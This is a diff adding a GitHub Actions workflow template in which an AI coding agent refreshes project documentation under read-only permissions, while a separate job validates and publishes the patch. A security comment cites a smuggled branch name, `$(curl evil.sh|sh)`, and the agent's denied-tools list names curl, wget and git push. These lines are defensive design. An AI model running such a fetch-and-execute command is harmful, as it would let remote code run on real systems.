@@ -1,0 +1,925 @@
+# Dossier documentation refresh
+#
+# Regenerates the affected documents of the dossier package after a merge and
+# opens a documentation pull request against this repository.
+#
+# ---------------------------------------------------------------------------
+# Rendering
+# ---------------------------------------------------------------------------
+# /dossier:setup renders this file into .github/workflows/ and substitutes every
+# placeholder below. Placeholders appear in the body as a name wrapped in double
+# braces; they are listed here unwrapped so that a naive whole-file substitution
+# cannot rewrite this comment. Nothing else in the file is templated, so a
+# rendered workflow and this template diff cleanly against each other.
+#
+#   DOSSIER_TRIGGER_EVENT     pull_request, or pull_request_target when
+#                             dossier.ci.forkPolicy is "target"
+#   DOSSIER_PATH_FILTERS      dossier.ci.pathFilters.include, rendered as
+#                             pre-indented YAML list items at six spaces
+#   DOSSIER_SCHEDULE_CRON     dossier.ci.schedule.cron
+#   DOSSIER_ROLLING_BRANCH    dossier.ci.rollingBranch
+#   DOSSIER_LABEL_GENERATED   dossier.ci.labels.generated
+#   DOSSIER_LABEL_SKIP        dossier.ci.labels.skip
+#   DOSSIER_LABEL_OVERSIZED   dossier.ci.labels.oversized
+#   DOSSIER_DOCS_DIR          dossier.project.outputRoot
+#   DOSSIER_MARKETPLACE_URL   marketplace git URL passed to the action
+#   DOSSIER_MARKETPLACE_REPO  owner/name of the marketplace, for checkout
+#   DOSSIER_REF               marketplace tag the bin/ scripts are pinned to
+#   DOSSIER_PLUGIN_VERSION    plugin version this file was generated against
+#
+# dossier.ci.labels.force is deliberately absent: the force label is evaluated
+# at runtime by dossier-policy.sh from the settings cascade, so renaming it needs
+# no workflow edit. It only reaches this workflow at all when the merged pull
+# request also touched a watched path; use workflow_dispatch otherwise.
+#
+# After rendering, setup stamps the file with dossier-managed-file.sh so a later
+# re-run can tell a file it still owns from one you have edited by hand.
+#
+# ---------------------------------------------------------------------------
+# Why the file is shaped this way
+# ---------------------------------------------------------------------------
+# Read this before deleting a guard. Every one of them is load-bearing.
+#
+# 1. Three jobs, split by privilege. `policy` decides and gathers evidence with
+#    read permissions and no agent. `refresh` runs the agent with read
+#    permissions, no write token and no persisted git credentials. `publish`
+#    holds the write token, runs no agent and never sees an API key. There is no
+#    point in this workflow where agent-influenced code and a write token share
+#    a filesystem, so the worst outcome of a fully prompt-injected agent is a
+#    patch that the privileged job rejects.
+#
+# 2. Range-based, not pull-request-based. The refresh documents
+#    watermark..HEAD, not the triggering pull request's diff. Dropped runs from
+#    GitHub's pending-run coalescing, simultaneous merges, retries and the
+#    merge/schedule trigger composition all stop being correctness problems: a
+#    lost run only widens the next run's range.
+#
+# 3. The agent edits files; the workflow does every git and GitHub operation.
+#    That is enforced by --disallowedTools rather than by asking nicely.
+#
+# 4. The workflow calls the plugin's own scripts instead of reimplementing
+#    policy in YAML, so a CI run and a local /dossier:refresh see identical
+#    evidence and identical decisions.
+#
+# 5. Zero ${{ github.event.* }} interpolation inside any run: body. Every
+#    untrusted value binds to env: and is read as "$VAR". A pull request title
+#    containing shell metacharacters is then data, not code.
+#
+# 6. No forced push anywhere, and merge-forward rather than rebase. The literal
+#    flag does not appear in this file at all, so the invariant is greppable.
+
+name: Dossier documentation refresh
+
+on:
+  {{DOSSIER_TRIGGER_EVENT}}:
+    types: [closed]
+    # Coarse filter, evaluated by GitHub before a runner exists, so a merge that
+    # touches nothing documentable costs literally nothing. The finer
+    # dossier.ci.pathFilters.exclude list is applied at runtime.
+    paths:
+{{DOSSIER_PATH_FILTERS}}
+
+  # The sweep. It catches whatever the path filters missed and whatever a
+  # dropped run left behind. On a current repository the policy job exits in
+  # well under a minute having spent no tokens at all.
+  schedule:
+    - cron: '{{DOSSIER_SCHEDULE_CRON}}'
+
+  workflow_dispatch:
+    inputs:
+      force:
+        description: 'Bypass the advisory policy rules (disabled, loop guard and circuit breaker still apply)'
+        type: boolean
+        default: false
+      base_sha:
+        description: 'Document from this commit instead of the stored watermark'
+        type: string
+        default: ''
+
+# No blanket grant. Each job asks for exactly what it needs and nothing else.
+permissions: {}
+
+# One group for the whole workflow, and queued rather than cancelled: a
+# cancelled publish can leave a pushed branch with no pull request, which is
+# harder to notice than a slightly delayed run.
+concurrency:
+  group: dossier-docs-refresh
+  cancel-in-progress: false
+
+env:
+  DOSSIER_BIN: .dossier-plugin/plugins/dossier/bin
+  CLAUDE_PLUGIN_ROOT: .dossier-plugin/plugins/dossier
+  DOSSIER_DOCS_DIR: '{{DOSSIER_DOCS_DIR}}'
+  DOSSIER_PLUGIN_VERSION: '{{DOSSIER_PLUGIN_VERSION}}'
+
+jobs:
+  # ==========================================================================
+  # policy — decide whether to run, and gather the evidence if so.
+  # ==========================================================================
+  policy:
+    name: Decide and gather evidence
+    # The hard loop guard. GitHub evaluates this before allocating a runner, so
+    # a documentation pull request that re-triggers the workflow costs nothing
+    # at all rather than costing a cheap run.
+    #
+    # Four independent layers, because each one fails in a different situation:
+    #   head-ref prefix — the strongest. Works no matter which identity opened
+    #     the documentation pull request, which is exactly why the bot-actor
+    #     check below is not sufficient on its own: a maintainer who reopens or
+    #     recreates the documentation pull request under their own account would
+    #     defeat it.
+    #   generated label — survives a branch rename.
+    #   skip label — the manual opt-out, for a merge nobody wants documented.
+    #   bot actor — catches a differently-named branch opened by automation.
+    # A fifth falls out for free: the documentation branch only ever touches the
+    # package directory, which is in pathFilters.exclude, so the policy script
+    # would answer no even if every guard here were deleted.
+    if: >-
+      github.event_name != '{{DOSSIER_TRIGGER_EVENT}}' ||
+      ( github.event.pull_request.merged == true &&
+        !startsWith(github.event.pull_request.head.ref, '{{DOSSIER_ROLLING_BRANCH}}') &&
+        !contains(github.event.pull_request.labels.*.name, '{{DOSSIER_LABEL_GENERATED}}') &&
+        !contains(github.event.pull_request.labels.*.name, '{{DOSSIER_LABEL_SKIP}}') &&
+        github.event.pull_request.user.login != 'github-actions[bot]' )
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    permissions:
+      contents: read
+      pull-requests: read
+    outputs:
+      should_run: ${{ steps.decide.outputs.should_run }}
+      reason: ${{ steps.decide.outputs.reason }}
+      base_sha: ${{ steps.decide.outputs.base_sha }}
+      head_sha: ${{ steps.decide.outputs.head_sha }}
+      base_source: ${{ steps.decide.outputs.base_source }}
+      docs_branch: ${{ steps.decide.outputs.docs_branch }}
+      existing_pr: ${{ steps.decide.outputs.existing_pr }}
+      max_turns: ${{ steps.decide.outputs.max_turns }}
+      model_arg: ${{ steps.decide.outputs.model_arg }}
+    steps:
+      # fetch-depth: 0 in every job. The watermark can be arbitrarily far back,
+      # and a shallow clone turns "resolve the range" into "fail confusingly".
+      - name: Check out the repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+
+      # The plugin's scripts are pinned to a tag, unlike the skill text the
+      # action installs from the marketplace, which always tracks main because
+      # plugin_marketplaces accepts no ref. Set dossier.ci.instructionSource to
+      # "vendored" if you need the instructions pinned too.
+      - name: Check out the dossier plugin
+        uses: actions/checkout@v4
+        with:
+          repository: '{{DOSSIER_MARKETPLACE_REPO}}'
+          ref: '{{DOSSIER_REF}}'
+          path: .dossier-plugin
+          # Shallow on purpose. The full-depth rule applies to the repository
+          # being documented, whose history is the evidence; this checkout is a
+          # pinned tag of a tool repository and no script reads its history.
+          fetch-depth: 1
+          persist-credentials: false
+
+      - name: Decide
+        id: decide
+        env:
+          # Every untrusted value is bound here and read as "$VAR" below. None
+          # of them is interpolated into a run: body, so a branch named
+          # `$(curl evil.sh|sh)` is a string and stays one.
+          EVT: ${{ github.event_name }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          # merge_commit_sha, not github.sha: for a pull_request event github.sha
+          # names a throwaway test-merge commit that exists on no branch, so a
+          # watermark advanced to it would be unreachable on the next run.
+          PR_MERGE_SHA: ${{ github.event.pull_request.merge_commit_sha }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
+          PR_IS_FORK: ${{ github.event.pull_request.head.repo.fork }}
+          PR_LABELS: ${{ join(github.event.pull_request.labels.*.name, ',') }}
+          PR_ACTOR: ${{ github.event.pull_request.user.login }}
+          DISPATCH_FORCE: ${{ inputs.force }}
+          DISPATCH_BASE: ${{ inputs.base_sha }}
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -uo pipefail
+          chmod +x "$DOSSIER_BIN"/*.sh
+          "$DOSSIER_BIN/dossier-policy.sh" \
+            --github-output "$GITHUB_OUTPUT" \
+            --summary "$GITHUB_STEP_SUMMARY"
+
+      - name: Build the evidence bundle
+        if: steps.decide.outputs.should_run == 'true'
+        env:
+          BASE_SHA: ${{ steps.decide.outputs.base_sha }}
+          HEAD_SHA: ${{ steps.decide.outputs.head_sha }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
+          PR_MERGED_AT: ${{ github.event.pull_request.merged_at }}
+          PR_ACTOR: ${{ github.event.pull_request.user.login }}
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -uo pipefail
+          "$DOSSIER_BIN/dossier-evidence.sh" \
+            --base "$BASE_SHA" --head "$HEAD_SHA" \
+            --out .dossier/evidence
+
+          # The blast-radius map lives beside the bundle rather than inside it,
+          # so that manifest.json keeps describing exactly the canonical evidence
+          # format and nothing else.
+          "$DOSSIER_BIN/dossier-blast-radius.sh" \
+            --changed-files .dossier/evidence/changed-files.txt \
+            --out .dossier/blast-radius.json
+
+          {
+            echo '### Documents in the blast radius'
+            echo
+            jq -r '.documents[] | "- `" + .path + "` — " + (.reasons | join(", "))' .dossier/blast-radius.json
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Upload the evidence bundle
+        if: steps.decide.outputs.should_run == 'true'
+        uses: actions/upload-artifact@v4
+        with:
+          name: dossier-evidence
+          path: .dossier/
+          retention-days: 7
+          if-no-files-found: error
+
+  # ==========================================================================
+  # refresh — the agent. Read permissions only, and no persisted credentials.
+  # ==========================================================================
+  refresh:
+    name: Refresh the documentation
+    needs: policy
+    if: needs.policy.outputs.should_run == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    permissions:
+      # Deliberately no write scope. The action needs a GITHUB_TOKEN to exist,
+      # so one is supplied, but it cannot write and Bash(gh:*) is denied. The
+      # residual exposure is read access to a repository already checked out.
+      contents: read
+    outputs:
+      proceeded: ${{ steps.preflight.outputs.proceed }}
+      has_changes: ${{ steps.validate.outputs.has_changes }}
+      size_class: ${{ steps.validate.outputs.size_class }}
+      files_changed: ${{ steps.validate.outputs.files_changed }}
+      lines_changed: ${{ steps.validate.outputs.lines_changed }}
+    steps:
+      # FIRST, before any checkout or download. Secrets are not visible in a
+      # job-level if:, so the credential decision cannot be made anywhere else.
+      #
+      # Note what is bound below: booleans, never the secret values. This step
+      # decides whether a key exists without ever holding one.
+      - name: Credentials preflight
+        id: preflight
+        env:
+          HAS_API_KEY: ${{ secrets.ANTHROPIC_API_KEY != '' }}
+          HAS_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN != '' }}
+          IS_FORK: ${{ github.event.pull_request.head.repo.fork }}
+        run: |
+          set -uo pipefail
+
+          if [ "$HAS_API_KEY" = "true" ] || [ "$HAS_OAUTH_TOKEN" = "true" ]; then
+            echo "proceed=true" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          if [ "$IS_FORK" = "true" ]; then
+            # GitHub withholds secrets from fork pull_request runs by design.
+            # That is documented behaviour, not misconfiguration, and failing
+            # every community contribution over it would be unusable noise. The
+            # scheduled sweep covers the same range from the base repository.
+            echo "::notice title=Dossier::Fork pull request: secrets are unavailable by design, so no refresh ran. The scheduled sweep will document this range."
+            {
+              echo '### Dossier refresh skipped (fork pull request)'
+              echo
+              echo 'GitHub does not expose repository secrets to workflows triggered by a'
+              echo 'pull request from a fork. This is by design and not a misconfiguration.'
+              echo
+              echo 'The range this merge belongs to will be documented by the next scheduled'
+              echo 'sweep. To document fork merges immediately instead, re-run `/dossier:setup`'
+              echo 'and choose the `pull_request_target` trigger — which is safe here only'
+              echo 'because this workflow never checks out pull request head code.'
+            } >> "$GITHUB_STEP_SUMMARY"
+            echo "proceed=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          # Same-repository merge with no key. This fails rather than skips: a
+          # skipped refresh leaves documentation that looks current and is not,
+          # which is the exact failure the package exists to prevent.
+          echo "::error title=Dossier::No Anthropic credential is configured. Documentation was NOT refreshed."
+          {
+            echo '### Dossier refresh failed: no credential configured'
+            echo
+            echo 'Set one of the following, then re-run this workflow:'
+            echo
+            echo '```sh'
+            echo 'gh secret set ANTHROPIC_API_KEY          # an Anthropic API key'
+            echo 'gh secret set CLAUDE_CODE_OAUTH_TOKEN    # or a Claude Code OAuth token'
+            echo '```'
+            echo
+            echo 'If you do not want automated documentation on this repository, disable the'
+            echo 'workflow rather than leaving it failing:'
+            echo
+            echo '```sh'
+            echo 'gh workflow disable dossier-docs-refresh.yml'
+            echo '```'
+            echo
+            echo 'This is a hard failure on purpose. Skipping would leave the documentation'
+            echo 'package looking current while the code moved underneath it.'
+          } >> "$GITHUB_STEP_SUMMARY"
+          echo "proceed=false" >> "$GITHUB_OUTPUT"
+          exit 1
+
+      - name: Check out the repository
+        if: steps.preflight.outputs.proceed == 'true'
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          # No credentials in the agent's checkout. Even if the agent found a
+          # way to run git push, there would be nothing to authenticate with.
+          persist-credentials: false
+
+      - name: Check out the dossier plugin
+        if: steps.preflight.outputs.proceed == 'true'
+        uses: actions/checkout@v4
+        with:
+          repository: '{{DOSSIER_MARKETPLACE_REPO}}'
+          ref: '{{DOSSIER_REF}}'
+          path: .dossier-plugin
+          # Shallow on purpose. The full-depth rule applies to the repository
+          # being documented, whose history is the evidence; this checkout is a
+          # pinned tag of a tool repository and no script reads its history.
+          fetch-depth: 1
+          persist-credentials: false
+
+      # .git/info/exclude, not .gitignore: .gitignore is a tracked file that the
+      # merged pull request could have edited, and the allowlist check that runs
+      # later must not be steerable from the range being documented.
+      - name: Exclude generated directories from the working tree
+        if: steps.preflight.outputs.proceed == 'true'
+        run: |
+          set -uo pipefail
+          {
+            echo '.dossier/'
+            echo '.dossier-plugin/'
+          } >> .git/info/exclude
+
+      - name: Download the evidence bundle
+        if: steps.preflight.outputs.proceed == 'true'
+        uses: actions/download-artifact@v4
+        with:
+          name: dossier-evidence
+          path: .dossier/
+
+      - name: Verify the evidence bundle
+        if: steps.preflight.outputs.proceed == 'true'
+        run: |
+          set -uo pipefail
+          if [ ! -f .dossier/evidence/manifest.json ]; then
+            echo "::error title=Dossier::The evidence bundle did not arrive. Refusing to document a range whose evidence is unknown."
+            exit 1
+          fi
+          jq -r '"Documenting \(.range.spec) — \(.counts.changed_files) files, \(.counts.commits) commits."' \
+            .dossier/evidence/manifest.json
+
+      # The prompt is static and carries a path, never content. Nothing
+      # attacker-controlled is interpolated into it. Every piece of untrusted
+      # text — pull request titles and bodies, branch names, commit messages —
+      # reaches the agent as data inside the evidence bundle, whose manifest
+      # carries an explicit machine-readable `untrusted` array that the refresh
+      # skill keys a hard rule off.
+      - name: Refresh the affected documents
+        if: steps.preflight.outputs.proceed == 'true'
+        uses: anthropics/claude-code-action@v1
+        with:
+          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          github_token: ${{ github.token }}
+          plugin_marketplaces: '{{DOSSIER_MARKETPLACE_URL}}'
+          plugins: 'dossier@synapti-marketplace'
+          prompt: '/dossier:refresh --evidence .dossier/evidence/manifest.json --mode ci'
+          claude_args: |
+            --max-turns ${{ needs.policy.outputs.max_turns }}
+            ${{ needs.policy.outputs.model_arg }}
+            --allowedTools "Read,Glob,Grep,Edit,Write,MultiEdit,TodoWrite,Bash(git status:*),Bash(git diff:*),Bash(git log:*),Bash(git show:*),Bash(jq:*)"
+            --disallowedTools "WebFetch,WebSearch,Bash(gh:*),Bash(curl:*),Bash(wget:*),Bash(git push:*),Bash(git remote:*),Bash(git config:*),Bash(env:*)"
+
+      # Hard-fails on any path outside the allowlist and on any credential
+      # pattern in the generated text. Both are failures rather than filters: a
+      # filter would produce a clean-looking patch and leave no record that
+      # anything tried to escape.
+      - name: Validate the patch
+        id: validate
+        if: steps.preflight.outputs.proceed == 'true'
+        run: |
+          set -uo pipefail
+          "$DOSSIER_BIN/dossier-validate-patch.sh" \
+            --out .dossier/docs.patch \
+            --github-output "$GITHUB_OUTPUT" \
+            --summary "$GITHUB_STEP_SUMMARY"
+
+      - name: Upload the patch
+        if: steps.validate.outputs.has_changes == 'true'
+        uses: actions/upload-artifact@v4
+        with:
+          name: dossier-patch
+          path: .dossier/docs.patch
+          retention-days: 7
+          if-no-files-found: error
+
+  # ==========================================================================
+  # publish — the only job with a write token, and the only one with no agent
+  # and no Anthropic key. Deterministic shell throughout.
+  # ==========================================================================
+  publish:
+    name: Publish the documentation pull request
+    needs: [policy, refresh]
+    # Runs even when there is no patch, because a no-op run still has to advance
+    # the cursor. Without that the range would keep widening until some run
+    # finally produced a change.
+    if: needs.policy.outputs.should_run == 'true' && needs.refresh.outputs.proceeded == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: write
+      pull-requests: write
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Check out the dossier plugin
+        uses: actions/checkout@v4
+        with:
+          repository: '{{DOSSIER_MARKETPLACE_REPO}}'
+          ref: '{{DOSSIER_REF}}'
+          path: .dossier-plugin
+          # Shallow on purpose. The full-depth rule applies to the repository
+          # being documented, whose history is the evidence; this checkout is a
+          # pinned tag of a tool repository and no script reads its history.
+          fetch-depth: 1
+          persist-credentials: false
+
+      - name: Exclude generated directories from the working tree
+        run: |
+          set -uo pipefail
+          {
+            echo '.dossier/'
+            echo '.dossier-plugin/'
+          } >> .git/info/exclude
+
+      - name: Download the evidence bundle
+        uses: actions/download-artifact@v4
+        with:
+          name: dossier-evidence
+          path: .dossier/
+
+      - name: Download the patch
+        if: needs.refresh.outputs.has_changes == 'true'
+        uses: actions/download-artifact@v4
+        with:
+          name: dossier-patch
+          path: .dossier/
+
+      # The refresh job is the untrusted one. Its own validation is a
+      # convenience that fails fast and cheaply; this is the control. The same
+      # script runs both times on purpose — a divergent second implementation
+      # would be a second thing to keep correct, and what has to be independent
+      # here is the invocation, not the code. This job trusts the patch's bytes
+      # and nothing the previous job concluded about them.
+      - name: Re-validate the patch
+        id: revalidate
+        if: needs.refresh.outputs.has_changes == 'true'
+        run: |
+          set -uo pipefail
+          chmod +x "$DOSSIER_BIN"/*.sh
+          "$DOSSIER_BIN/dossier-validate-patch.sh" \
+            --verify-patch .dossier/docs.patch \
+            --github-output "$GITHUB_OUTPUT" \
+            --summary "$GITHUB_STEP_SUMMARY"
+
+      # A second, authoritative reading of the circuit breaker. The policy job
+      # read it before the run; only this job knows the count at the moment a
+      # pull request would actually be created, which is the number that matters.
+      # It bounds runaway loops, not runaway cost: GitHub Actions has no spend
+      # cap for third-party API calls, so keep a budget on the Anthropic console.
+      - name: Circuit breaker audit
+        if: needs.refresh.outputs.has_changes == 'true'
+        env:
+          GH_TOKEN: ${{ github.token }}
+          LABEL_GENERATED: '{{DOSSIER_LABEL_GENERATED}}'
+        run: |
+          set -uo pipefail
+          MAX=$("$DOSSIER_BIN/cascade-resolve.sh" --default '6' '.dossier.ci.circuitBreaker.maxDocPrsPer24h')
+          case "$MAX" in ''|*[!0-9]*) MAX=6 ;; esac
+
+          SINCE=$(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null \
+                    || date -u -v-24H +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo '')
+          if [ -z "$SINCE" ]; then
+            echo "::warning title=Dossier::Could not compute a 24-hour cutoff; the circuit breaker was not evaluated."
+            exit 0
+          fi
+
+          COUNT=$(gh pr list --state all --limit 100 --label "$LABEL_GENERATED" \
+                    --json createdAt --jq "[.[] | select(.createdAt > \"$SINCE\")] | length" 2>/dev/null)
+          case "$COUNT" in ''|*[!0-9]*) COUNT=0 ;; esac
+
+          echo "Documentation pull requests opened in the last 24 hours: $COUNT (limit $MAX)."
+          if [ "$COUNT" -ge "$MAX" ]; then
+            echo "::error title=Dossier::Circuit breaker open — $COUNT documentation pull requests in 24 hours (limit $MAX)."
+            {
+              echo '### Dossier circuit breaker open'
+              echo
+              echo "$COUNT documentation pull requests were opened in the last 24 hours,"
+              echo "at or above the limit of $MAX. Publishing stopped before creating another."
+              echo
+              echo 'Find the loop before raising the limit. The usual causes are a documentation'
+              echo 'branch prefix that no longer matches `dossier.ci.rollingBranch`, or a missing'
+              echo '`{{DOSSIER_LABEL_GENERATED}}` label on the generated pull requests.'
+            } >> "$GITHUB_STEP_SUMMARY"
+            exit 1
+          fi
+
+      - name: Prepare the documentation branch
+        id: branch
+        if: needs.refresh.outputs.has_changes == 'true'
+        env:
+          DOCS_BRANCH: ${{ needs.policy.outputs.docs_branch }}
+          EXISTING_PR: ${{ needs.policy.outputs.existing_pr }}
+          BASE_SHA: ${{ needs.policy.outputs.base_sha }}
+          HEAD_SHA: ${{ needs.policy.outputs.head_sha }}
+          BASE_REF: ${{ github.event.pull_request.base.ref || github.event.repository.default_branch }}
+          SOURCE_PR: ${{ github.event.pull_request.number }}
+          SOURCE_PR_TITLE: ${{ github.event.pull_request.title }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          set -uo pipefail
+
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+
+          git fetch --no-tags --prune origin "+refs/heads/${BASE_REF}:refs/remotes/origin/${BASE_REF}"
+
+          MODE=create
+          if git ls-remote --exit-code --heads origin "$DOCS_BRANCH" >/dev/null 2>&1; then
+            git fetch --no-tags origin "+refs/heads/${DOCS_BRANCH}:refs/remotes/origin/${DOCS_BRANCH}"
+
+            # Ownership is established per commit by the Dossier-Generated
+            # trailer, never by author. Authorship varies with whichever token
+            # identity created the commit, and it is trivially spoofable; a
+            # trailer we write ourselves on every commit is not a stronger
+            # secret, but it is a far more reliable label.
+            FOREIGN=''
+            for C in $(git rev-list "origin/${BASE_REF}..origin/${DOCS_BRANCH}" 2>/dev/null); do
+              if ! git show -s --format=%B "$C" | grep -qiE '^Dossier-Generated:[[:space:]]*true[[:space:]]*$'; then
+                FOREIGN="${FOREIGN} ${C}"
+              fi
+            done
+
+            if [ -n "$EXISTING_PR" ]; then
+              MODE=update
+              if [ -n "$FOREIGN" ]; then
+                echo "::notice title=Dossier::The documentation branch carries commits this job did not write. They are preserved; the refresh lands on top of them."
+              fi
+            elif [ -n "$FOREIGN" ]; then
+              echo "::error title=Dossier::The documentation branch has no open pull request but carries commits without a Dossier-Generated trailer."
+              {
+                echo '### Dossier publish stopped: unrecognised commits on the documentation branch'
+                echo
+                echo "\`${DOCS_BRANCH}\` has no open pull request, so it would normally be recreated"
+                echo 'from the base branch. It carries commits this job did not write:'
+                echo
+                echo '```'
+                for C in $FOREIGN; do git log -1 --format='%h %an %s' "$C"; done
+                echo '```'
+                echo
+                echo 'Nothing was deleted. Merge or move that work, or delete the branch yourself'
+                echo 'once you are sure it is finished, then re-run this workflow.'
+              } >> "$GITHUB_STEP_SUMMARY"
+              exit 1
+            else
+              MODE=recreate
+            fi
+          fi
+          echo "mode=${MODE}" >> "$GITHUB_OUTPUT"
+
+          case "$MODE" in
+            recreate)
+              # Every commit was verified ours and no pull request is open, so
+              # the accumulated history is superseded rather than in progress.
+              # Deleting and re-creating is not a force push: nothing is
+              # overwritten, and nothing this job did not write is touched.
+              echo "Recreating ${DOCS_BRANCH} from ${BASE_REF} (all previous commits were generated, no open pull request)."
+              git push origin --delete "$DOCS_BRANCH"
+              git checkout -q -B "$DOCS_BRANCH" "origin/${BASE_REF}"
+              ;;
+            create)
+              git checkout -q -B "$DOCS_BRANCH" "origin/${BASE_REF}"
+              ;;
+            update)
+              git checkout -q -B "$DOCS_BRANCH" "origin/${DOCS_BRANCH}"
+
+              # Merge forward, never rebase. Rebasing a shared branch under an
+              # open pull request invalidates every review comment on it and
+              # requires a force push, which this design does not do anywhere.
+              #
+              # -X theirs resolves content conflicts toward the base branch. The
+              # fresh patch lands immediately afterwards and re-establishes the
+              # current documentation state, so the only thing a conflict can
+              # discard is a superseded generation.
+              MERGE_MSG=$(printf 'chore(dossier): merge %s into the documentation branch\n\nDossier-Generated: true\n' "$BASE_REF")
+              if ! git merge --no-edit -X theirs -m "$MERGE_MSG" "origin/${BASE_REF}"; then
+                UNMERGED=$(git diff --name-only --diff-filter=U)
+
+                # -X theirs cannot resolve a modify/delete conflict. Those are
+                # resolved toward the base branch too, but only inside the
+                # documentation directory: a conflict anywhere else means
+                # something pushed non-documentation content onto this branch,
+                # and that is a stop, not a merge strategy. The test is
+                # deliberately narrower than the configured allowlist, because a
+                # narrower test can only ever produce a loud failure.
+                OUTSIDE=''
+                for P in $UNMERGED; do
+                  case "$P" in
+                    "${DOSSIER_DOCS_DIR}"/*) : ;;
+                    *) OUTSIDE="${OUTSIDE} ${P}" ;;
+                  esac
+                done
+                if [ -n "$OUTSIDE" ]; then
+                  git merge --abort 2>/dev/null
+                  echo "::error title=Dossier::Merge conflicts outside ${DOSSIER_DOCS_DIR}:${OUTSIDE}"
+                  {
+                    echo '### Dossier publish stopped: conflict outside the documentation package'
+                    echo
+                    echo 'Merging the base branch into the documentation branch conflicted on paths'
+                    echo 'that are not documentation:'
+                    echo
+                    for P in $OUTSIDE; do echo "- \`$P\`"; done
+                    echo
+                    echo 'Resolve the branch by hand. Nothing was changed.'
+                  } >> "$GITHUB_STEP_SUMMARY"
+                  exit 1
+                fi
+
+                for P in $UNMERGED; do
+                  if git cat-file -e "origin/${BASE_REF}:${P}" 2>/dev/null; then
+                    git checkout "origin/${BASE_REF}" -- "$P"
+                  else
+                    git rm -q -f -- "$P"
+                  fi
+                done
+                git commit -q -m "$MERGE_MSG" || {
+                  echo "::error title=Dossier::Could not complete the merge commit."
+                  exit 1
+                }
+              fi
+              ;;
+          esac
+
+      - name: Apply the patch and commit
+        id: commit
+        if: needs.refresh.outputs.has_changes == 'true'
+        env:
+          BASE_SHA: ${{ needs.policy.outputs.base_sha }}
+          HEAD_SHA: ${{ needs.policy.outputs.head_sha }}
+          DOCS_BRANCH: ${{ needs.policy.outputs.docs_branch }}
+          SOURCE_PR: ${{ github.event.pull_request.number }}
+          SOURCE_PR_TITLE: ${{ github.event.pull_request.title }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          set -uo pipefail
+
+          if ! git apply --index --binary --whitespace=nowarn .dossier/docs.patch 2>/dev/null; then
+            # The patch was generated against the pre-merge tree, so a clean
+            # apply can fail after merging forward. Three-way uses the blobs the
+            # patch records, all of which are present in this checkout.
+            if ! git apply --3way --binary --whitespace=nowarn .dossier/docs.patch; then
+              echo "::error title=Dossier::The documentation patch does not apply to the documentation branch."
+              {
+                echo '### Dossier publish stopped: the patch does not apply'
+                echo
+                echo 'This usually means the documentation branch moved between the refresh and'
+                echo 'the publish. Re-run the workflow: the next run recomputes the range from the'
+                echo 'watermark, so nothing is lost.'
+              } >> "$GITHUB_STEP_SUMMARY"
+              exit 1
+            fi
+          fi
+
+          if git diff --cached --quiet; then
+            echo "::notice title=Dossier::The patch produced no net change after merging forward. Nothing to commit."
+            echo "committed=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          # Untrusted text reaching a commit subject is stripped of control
+          # characters and truncated. It is never interpolated into the shell —
+          # it arrives in an environment variable and leaves through a file.
+          SAFE_TITLE=$(printf '%s' "${SOURCE_PR_TITLE:-}" \
+            | LC_ALL=C tr -cd '[:print:][:space:]' \
+            | tr '\r\n\t' '   ' \
+            | tr -d '`$\\' \
+            | cut -c1-72)
+          if [ -n "${SOURCE_PR:-}" ]; then
+            SUBJECT="docs(dossier): refresh for #${SOURCE_PR} ${SAFE_TITLE}"
+          else
+            SUBJECT="docs(dossier): refresh for ${BASE_SHA}..${HEAD_SHA}"
+          fi
+          SUBJECT=$(printf '%s' "$SUBJECT" | cut -c1-100)
+
+          # These trailers buy back the one real cost of a rolling branch over
+          # per-pull-request branches: `git log --grep 'Dossier-Source-PR: #<n>'`
+          # answers "what did that merge change in the documentation" exactly as
+          # well as a dedicated branch would have.
+          {
+            printf '%s\n\n' "$SUBJECT"
+            printf 'Regenerated the documents affected by this range.\n\n'
+            printf 'Dossier-Generated: true\n'
+            printf 'Dossier-Range: %s..%s\n' "$BASE_SHA" "$HEAD_SHA"
+            if [ -n "${SOURCE_PR:-}" ]; then
+              printf 'Dossier-Source-PR: #%s\n' "$SOURCE_PR"
+            fi
+            printf 'Dossier-Run: %s\n' "$RUN_URL"
+          } > .dossier/commit-message.txt
+
+          git commit -q -F .dossier/commit-message.txt
+          echo "committed=true" >> "$GITHUB_OUTPUT"
+
+          # Fast-forward push. Nothing here pushes with force, with or without a
+          # lease: the single concurrency group means a rejection is a real
+          # anomaly and should be read, not overridden.
+          if ! git push origin "HEAD:refs/heads/${DOCS_BRANCH}"; then
+            echo "::error title=Dossier::Pushing ${DOCS_BRANCH} was rejected. Nothing was force-pushed."
+            {
+              echo '### Dossier publish stopped: the push was rejected'
+              echo
